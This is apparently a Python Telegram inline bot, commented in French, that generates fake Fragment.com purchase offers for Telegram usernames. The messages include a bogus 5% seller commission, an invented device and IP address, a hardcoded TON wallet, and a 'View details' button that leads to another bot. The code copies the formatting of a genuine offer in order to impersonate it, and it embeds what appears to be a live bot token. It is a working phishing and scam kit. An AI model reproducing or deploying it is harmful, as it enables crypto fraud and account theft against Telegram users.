import os
import time
import urllib.request
import json
import asyncio
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity
from telegram.ext import Application, InlineQueryHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"

print(f"🤖 Inline Fragment Deal Generator v4.6")
print(f"🔑 Token: ✅")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")

# Variables globales
app = None
event_loop = None

def get_ton_price():
    """Récupère le prix du TON en temps réel"""
    try:
        # API CoinGecko plus fiable
        url = "https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd"
        with urllib.request.urlopen(url, timeout=10) as response:
            data = json.loads(response.read().decode())
            price = float(data['the-open-network']['usd'])
            print(f"💰 Prix TON récupéré: ${price:.4f}")
            return price
    except Exception as e:
        print(f"❌ Erreur API CoinGecko: {e}")
        # Fallback vers DIA API
        try:
            url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
            with urllib.request.urlopen(url, timeout=5) as response:
                data = json.loads(response.read().decode())
                price = float(data.get('Price', 5.50))
                print(f"💰 Prix TON (fallback): ${price:.4f}")
                return price
        except Exception as e2:
            print(f"❌ Erreur API DIA: {e2}")
            # Prix par défaut si toutes les APIs échouent
            return 5.50

def generate_fragment_message(username, ton_amount):
    """Génère le message Fragment avec formatage identique au bot original"""
    
    # Prix TON actuel - récupération en temps réel
    ton_price = get_ton_price()
    
    # Calculs
    price = float(ton_amount)
    price_usd = price * ton_price
    commission = price * 0.05
    commission_usd = commission * ton_price
    
    # Adresse wallet
    wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
    
    # Message Fragment - IDENTIQUE au bot original avec wallet en format Markdown
    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: [{wallet_address}](https://tonviewer.com/{wallet_address})

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""
    
    # Création des entités pour le formatage
    entities = []
    
    # 1. Offer Amount en gras
    offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
    offer_start = fragment_message.find(offer_text)
    if offer_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=offer_start,
            length=len(offer_text)
        ))
    
    # 2. Commission en gras
    commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
    commission_start = fragment_message.find(commission_text)
    if commission_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=commission_start,
            length=len(commission_text)
        ))
    
    # 3. Premier point Important en gras
    important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
    important_start1 = fragment_message.find(important_text1)
    if important_start1 != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=important_start1,
            length=len(important_text1)
        ))
    
    # 4. Deuxième point Important en gras
    important_text2 = "• If you choose not to proceed, simply ignore this message."
    important_start2 = fragment_message.find(important_text2)
    if important_start2 != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=important_start2,
            length=len(important_text2)
        ))
    
    # URL du bouton - identique au bot original
    button_url = f"https://t.me/BidRequestApp_bot/?startapp={username.lower()}-{price:g}"
    
    # Bouton - identique au bot original
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("View details", url=button_url)]])
    
    return fragment_message, entities, keyboard

async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire pour les requêtes inline"""
    query = update.inline_query
    
    if not query:
        return
    
    user_input = query.query.strip()
    print(f"📝 Requête inline reçue: '{user_input}' de @{query.from_user.username}")
    
    results = []
    
    if user_input:
        try:
            # Parser l'entrée: format "@username montant" ou "username montant"
            parts = user_input.split()
            
            if len(parts) >= 2:
                # Format complet avec username et montant
                username = parts[0].replace('@', '').strip()
                amount_str = parts[1].strip()
                
                try:
                    amount = float(amount_str)
                    if amount <= 0:
                        raise ValueError("Montant invalide")
                except ValueError:
                    amount = 5000  # valeur par défaut
                
            elif len(parts) == 1:
                # Seulement username fourni
                username = parts[0].replace('@', '').strip()
                amount = 5000  # valeur par défaut
            else:
                # Entrée vide ou invalide
                username = "username"
                amount = 5000
            
            # Valider le username
            if not username or len(username) < 3:
                username = "username"
            
            # Générer le message Fragment
            message_text, entities, keyboard = generate_fragment_message(username, amount)
            
            # Créer le résultat inline
            from telegram import InlineQueryResultArticle, InputTextMessageContent
            
            result = InlineQueryResultArticle(
                id=f"fragment_{username}_{amount}_{int(time.time())}",
                title=f"Fragment Deal - @{username}",
                description=f"💎{amount:g} TON offer for @{username}",
                input_message_content=InputTextMessageContent(
                    message_text=message_text,
                    entities=entities,
                    parse_mode=None,
                    disable_web_page_preview=True
                ),
                reply_markup=keyboard,
                thumb_url="https://i.imgur.com/VJXqtWJ.png"
            )
            
            results.append(result)
            print(f"✅ Résultat généré pour @{username} - 💎{amount:g} TON")
            
        except Exception as e:
            print(f"❌ Erreur lors de la génération: {e}")
            
            # Résultat d'erreur
            from telegram import InlineQueryResultArticle, InputTextMessageContent
            
            error_result = InlineQueryResultArticle(
                id="error",
                title="❌ Format invalide",
                description="Utilisez: @username montant (ex: @john_doe 5000)",
                input_message_content=InputTextMessageContent(
                    message_text="❌ Erreur: Format invalide. Utilisez: `@username montant`\nExemple: `@john_doe 5000`",
                    parse_mode='Markdown'
                )
            )
            results.append(error_result)
    
    else:
        # Suggestions par défaut
        from telegram import InlineQueryResultArticle, InputTextMessageContent
        
        suggestions = [
            ("@john_doe 5000", "Exemple avec @john_doe - 5000 TON"),
            ("@crypto_master 2500", "Exemple avec @crypto_master - 2500 TON"),
            ("@username 1000", "Template générique - 1000 TON")
        ]
        
        for i, (example, desc) in enumerate(suggestions):
            result = InlineQueryResultArticle(
                id=f"suggestion_{i}",
                title="💡 Suggestion",
                description=desc,
                input_message_content=InputTextMessageContent(
                    message_text=f"💡 Tapez: `{example}` pour générer un deal Fragment",
                    parse_mode='Markdown'
                )
            )
            results.append(result)
    
    # Répondre à la requête
    try:
        await query.answer(
            results=results,
            cache_time=5,
            is_personal=True
        )
        print(f"📤 Réponse envoyée avec {len(results)} résultat(s)")
    except Exception as e:
        print(f"❌ Erreur lors de l'envoi de la réponse: {e}")

class WebhookHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Gérer les requêtes GET (health check)"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<html><body><h1>Bot is running!</h1></body></html>')
    
    def do_POST(self):
        """Gérer les webhooks Telegram"""
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            # Traitement asynchrone du webhook
            if event_loop and app:
                asyncio.run_coroutine_threadsafe(
                    process_webhook(post_data), 
                    event_loop
                )
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"ok":true}')
            
        except Exception as e:
            print(f"❌ Erreur webhook: {e}")
            self.send_response(500)
            self.end_headers()
    
    def log_message(self, format, *args):
        """Supprimer les logs HTTP verbeux"""
        pass

async def process_webhook(data):
    """Traiter les données du webhook"""
    try:
        update_data = json.loads(data.decode('utf-8'))
        update = Update.de_json(update_data, app.bot)
        await app.process_update(update)
    except Exception as e:
        print(f"❌ Erreur traitement webhook: {e}")

async def setup_bot():
    """Configuration et démarrage du bot"""
    global app, event_loop
    
    try:
        # Créer l'application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajouter le gestionnaire inline
        app.add_handler(InlineQueryHandler(inline_query_handler))
        
        # Configurer le webhook
        await app.bot.set_webhook(
            url=f"{WEBHOOK_URL}/webhook",
            allowed_updates=["inline_query"]
        )
        
        print(f"✅ Webhook configuré: {WEBHOOK_URL}/webhook")
        
        # Initialiser l'application
        await app.initialize()
        await app.start()
        
        print("🚀 Bot démarré avec succès!")
        
        # Démarrer le serveur HTTP dans un thread séparé
        event_loop = asyncio.get_event_loop()
        
        def start_server():
            server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
            print(f"🌐 Serveur webhook démarré sur le port {PORT}")
            server.serve_forever()
        
        server_thread = threading.Thread(target=start_server, daemon=True)
        server_thread.start()
        
        # Garder le bot en vie
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"❌ Erreur setup: {e}")
        raise

def main():
    """Fonction principale"""
    try:
        print("🚀 Démarrage du bot inline...")
        
        # Démarrage asynchrone
        asyncio.run(setup_bot())
        
    except KeyboardInterrupt:
        print("🛑 Arrêt du bot...")
    except Exception as e:
        print(f"❌ Erreur critique: {e}")

if __name__ == '__main__':
    main()
